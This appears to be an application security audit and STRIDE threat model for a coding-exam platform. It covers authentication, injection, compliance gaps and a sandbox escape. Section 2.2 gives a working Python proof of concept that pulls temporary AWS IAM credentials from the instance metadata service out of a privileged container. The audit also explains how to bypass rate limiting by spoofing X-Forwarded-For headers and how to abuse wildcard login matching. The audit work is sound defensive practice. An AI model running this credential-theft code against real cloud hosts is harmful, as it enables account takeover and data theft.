# 04. COMPREHENSIVE SECURITY ASSESSMENT & THREAT MODEL

**Target Commit:** `7c83df6ef13915c1171dd4b3e61f31a0c24306e2`  
**Discipline:** Application Security Architect, Threat Modeling Engineer, Cloud Infrastructure Security Engineer  
**Baseline Standard:** OWASP ASVS v4.0.3 (Level 2 Baseline, Level 3 for High-Assurance Examination Modules) & OWASP Top 10:2021 / API Security Top 10:2023

---

## 1. Threat Modeling (STRIDE Analysis)

| **Threat Category** | **Target Subsystem** | **Threat Scenario** | **Existing Mitigation** | **Residual Risk & Vulnerability** |
|---|---|---|---|---|
| **Spoofing Identity** | `AuthService.login` & `SmartThrottlerGuard` | Attacker spoofs client IP via `X-Forwarded-For` or guesses accounts via wildcard ILIKE (`%`, name prefix). | Smart throttler checks token first. | **HIGH (ISSUE-SEC-002, ISSUE-SEC-003)**: Rate-limiting completely bypassed; account lookup matches ambiguous users. |
| **Tampering With Data** | `ContestsService` & `AssessmentsService` | Concurrent modification of reattempt grants or scorecards during network blips; unshielded ALB endpoints. | DB unique constraints on `(contest_id, user_id, attemptNumber)`. | **HIGH (ISSUE-CON-001, ISSUE-INF-005)**: Race condition consumes grant and crashes transaction; missing WAF leaves public ALB unshielded. |
| **Repudiation** | `AuditLog` & `ExamSecurityEvents` | Candidate claims exam auto-submit or proctor penalty was an error or unauthorized action. | Event logging in `exam_security_events` table. | **MEDIUM**: Captures stored in S3; client violations accept client-side timestamps without server clock reconciliation. |
| **Information Disclosure** | Cloud Metadata, ElastiCache Redis, S3 Reports | Code sandbox makes HTTP request to IMDSv2 (`169.254.169.254`); Redis traffic in plaintext; S3 unencrypted. | IMDSv2 token required. | **CRITICAL (ISSUE-SEC-001, ISSUE-SEC-004, ISSUE-INF-006)**: Hop limit 2 allows container to fetch token; Redis unencrypted; S3 reports co-mingled with public avatars without default SSE. |
| **Denial of Service** | Assessment Submissions & Bulk Import | 500 students submit exam simultaneously; admin imports 2,000 students via CSV; ASG startup DDL race. | Throttler limits; Nginx timeout. | **CRITICAL (ISSUE-PRF-001, ISSUE-PRF-002, ISSUE-INF-003)**: Synchronous execution freezes server; bcrypt blocks event loop; ASG startup runs concurrent DDL deadlocks. |
| **Elevation of Privilege** | Piston Execution Host & Backend IAM Role | Untrusted student code escapes container; compromised backend extracts all AWS account secrets. | Non-root `piston` user in container. | **CRITICAL (ISSUE-SEC-001, ISSUE-INF-004)**: Container executed with `--privileged`; backend IAM policy grants `"Resource": "*"` on Secrets Manager & SSM. |

---

## 2. Sandbox Escape & Cloud Infrastructure Vector (ISSUE-SEC-001)

### 2.1 Attack Surface Analysis

The Piston service executes untrusted code submitted by arbitrary students. In `terraform/environments/production/userdata/piston.sh.tftpl`:
```sh
ExecStart=/usr/bin/docker run --rm --name codeskill-piston \
  -p 2001:2000 \
  -v /var/lib/piston:/piston \
  --privileged \
  $PISTON_IMAGE
```
1. **The `--privileged` Flag:**
   Running a Docker container with `--privileged` disables Linux seccomp profiles, AppArmor/SELinux confinement, and provides the container with direct access to host kernel devices (`/dev/*`). Any container escape (e.g. mounting host `/dev/xvda` or exploiting kernel vulnerabilities) yields root on the underlying EC2 host.
2. **Missing Network Isolation Flag:**
   The compose definition in `deployment/piston/compose.yaml` explicitly includes `PISTON_DISABLE_NETWORKING: 'true'`. However, in production Terraform userdata, this environment variable was **completely omitted**.
3. **IMDSv2 Hop Limit = 2:**
   `terraform/modules/ec2-asg/main.tf:28` configures:
   ```tf
   metadata_options {
     http_endpoint               = "enabled"
     http_tokens                 = "required"
     http_put_response_hop_limit = 2
   }
   ```
   A hop limit of 2 allows packets originating from within a container network bridge (1 hop to host, 1 hop to link-local metadata) to acquire valid IMDSv2 session tokens.

### 2.2 Proof of Concept Attack Mechanics (Theoretical Verification)
```python
# Malicious code submitted via POST /api/execution/run
import urllib.request, json

# 1. Acquire IMDSv2 Token (Hop limit = 2 succeeds from inside bridge container)
req = urllib.request.Request("http://169.254.169.254/latest/api/token", method="PUT")
req.add_header("X-aws-ec2-metadata-token-ttl-seconds", "300")
token = urllib.request.urlopen(req).read().decode()

# 2. Query attached IAM Role
role_req = urllib.request.Request("http://169.254.169.254/latest/meta-data/iam/security-credentials/", method="GET")
role_req.add_header("X-aws-ec2-metadata-token", token)
role_name = urllib.request.urlopen(role_req).read().decode().strip()

# 3. Exfiltrate temporary AWS credentials
cred_req = urllib.request.Request(f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}")
cred_req.add_header("X-aws-ec2-metadata-token", token)
credentials = json.loads(urllib.request.urlopen(cred_req).read().decode())
print(f"Exfiltrated AccessKeyId: {credentials['AccessKeyId']}")
```
**Remediation:**
- Configure `http_put_response_hop_limit = 1` across all ASG launch templates.
- Remove `--privileged` and explicitly disable networking in production systemd unit: `-e PISTON_DISABLE_NETWORKING=true`.

---

## 3. Authentication & Authorization Assessment

### 3.1 Authentication Implementation
- **Password Storage:** Uses `bcryptjs` with configurable rounds (default 10 via `bcryptRounds()`). Passwords enforce a minimum 8 characters and 72-byte max length (`PASSWORD_MAX_BYTES`), correctly mitigating bcrypt silent 72-byte truncation vulnerabilities.
- **Refresh Token Rotation:** `TokenService` implements single-use refresh token rotation with SHA-256 token hashing (`hashRefreshToken`) and family-based revocation (`familyId`). If a revoked token is reused outside the 10-second grace window, the entire family is immediately invalidated.
- **Session Revocation:** Bumps `tokenVersion` on user record, immediately invalidating all active JWTs on the next HTTP request or WebSocket handshake.

### 3.2 Authentication Vulnerabilities
1. **Wildcard & Non-Unique Identifier Matching (ISSUE-SEC-002):**
   `AuthService.login` matches users using:
   ```ts
   where: [
     { email: ILike(raw) },
     { uid: ILike(raw) },
     { username: ILike(raw) },
     { name: ILike(raw) },
     { email: ILike(`${raw}@%`) },
   ]
   ```
   - Unescaped `%` and `_` characters allow attackers to query the database with wildcard expressions.
   - Matching by `name` is non-unique and insecure. If multiple students share a common name, login checks against whichever arbitrary row PostgreSQL returns first.
2. **Client IP Rate-Limiting Bypass (ISSUE-SEC-003):**
   `SmartThrottlerGuard` reads `req.headers['x-forwarded-for'].split(',')[0]`. Because clients can inject arbitrary `X-Forwarded-For` headers and Express `trust proxy` is unconfigured, attackers can bypass all unauthenticated throttles by rotating client-supplied headers.

### 3.3 Authorization & Multi-Tenancy (BOLA / IDOR / BFLA)
- **Problem Ownership:** `ProblemsService` strictly verifies problem author or admin status before modifications.
- **Assessment Results & Proctoring Reports:** `ReportsController.getStudentResultReport` verifies `user.id === studentId || isAdmin`. If unauthorized, it returns 404 rather than 403, preventing resource enumeration.
- **Contest Gate:** `AppGateway.handleJoinContest` verifies that the connecting socket belongs to a registered participant or platform admin before allowing them to subscribe to contest rooms.
- **Campus & Company Portals:** Covered by explicit `CampusGuard` and `CompanyGuard` ensuring users cannot access batches or job applicants outside their institution.

---

## 4. Input Validation and Injection Analysis

| Injection Vector | Audit Status | Code Location | Finding / Assessment |
|---|---|---|---|
| **SQL Injection** | **VERIFIED CLEAN** | Repository / QueryBuilder | All TypeORM queries use parameterized variables (`$1, $2`) or object criteria. No raw string interpolations detected. |
| **Prototype Pollution** | **VULNERABLE (ISSUE-SEC-005)** | `StudentsService:372` | Uses `xlsx 0.18.5` (CVE-2023-30533) to parse untrusted spreadsheets uploaded by administrators. |
| **Cross-Site Scripting (XSS)** | **VERIFIED CLEAN** | Next.js Frontend | Next.js JSX automatically escapes rendered values. `dangerouslySetInnerHTML` is restricted to markdown renderers with sanitized HTML. |
| **Path Traversal** | **VERIFIED CLEAN** | `S3Service:133, 162` | S3 key generation rejects any key containing `..` or lacking approved prefixes (`proctoring/`, `avatars/`). |
| **Server-Side Request Forgery (SSRF)** | **CRITICAL (ISSUE-SEC-001)** | `piston.sh.tftpl` | Enabled in Piston sandbox due to missing network isolation flag and hop limit = 2. |
| **Mass Assignment** | **VERIFIED CLEAN** | `main.ts:145` | Global `ValidationPipe` with `whitelist: true` strips non-whitelisted payload properties. |

---

## 5. OWASP ASVS v4.0.3 Compliance Benchmark

| ASVS Verification Chapter | Level 2 Standard | Implementation Status | Non-Compliance Finding |
|---|---|---|---|
| **V1: Architecture & Threat Modeling** | L2 | **PARTIALLY COMPLIANT** | Untrusted code sandbox lacks network boundary; missing RDS connection pooler. |
| **V2: Authentication** | L2 | **COMPLIANT WITH CAVEAT** | Bcrypt salting and token rotation compliant; wildcard matching (`ISSUE-SEC-002`) violates V2.1. |
| **V3: Session Management** | L2 | **COMPLIANT** | Token versioning, family revocation, short-lived JWTs (15m) compliant with V3.3. |
| **V4: Access Control** | L2 | **COMPLIANT** | Explicit role guards and ownership verification on critical endpoints. |
| **V5: Validation & Sanitization** | L2 | **PARTIALLY COMPLIANT** | Input whitelisting compliant; spreadsheet parser contains unpatched CVEs (`ISSUE-SEC-005`). |
| **V8: Data Protection** | L2 | **NON-COMPLIANT** | ElastiCache Redis unencrypted in transit and at rest (`ISSUE-SEC-004`). |
| **V13: API & Web Service** | L2 | **PARTIALLY COMPLIANT** | Rate limiting bypassed via spoofed `X-Forwarded-For` (`ISSUE-SEC-003`). |
| **V14: Configuration** | L2 | **NON-COMPLIANT** | Piston runs `--privileged` without network isolation (`ISSUE-SEC-001`). |

---

## 6. Security Testing & Verification Gaps

1. **Automated DAST / Penetration Testing:**
   No dynamic application security testing (OWASP ZAP, Burp Suite) is integrated into CI/CD pipelines.
2. **Container Security Scanning:**
   Docker images pushed to Amazon ECR rely on basic scan-on-push; no continuous vulnerability alerting for base images.
3. **Automated Secret Scanning:**
   Git hooks do not enforce `trufflehog` or `git-secrets` before commits are pushed to remote repositories.
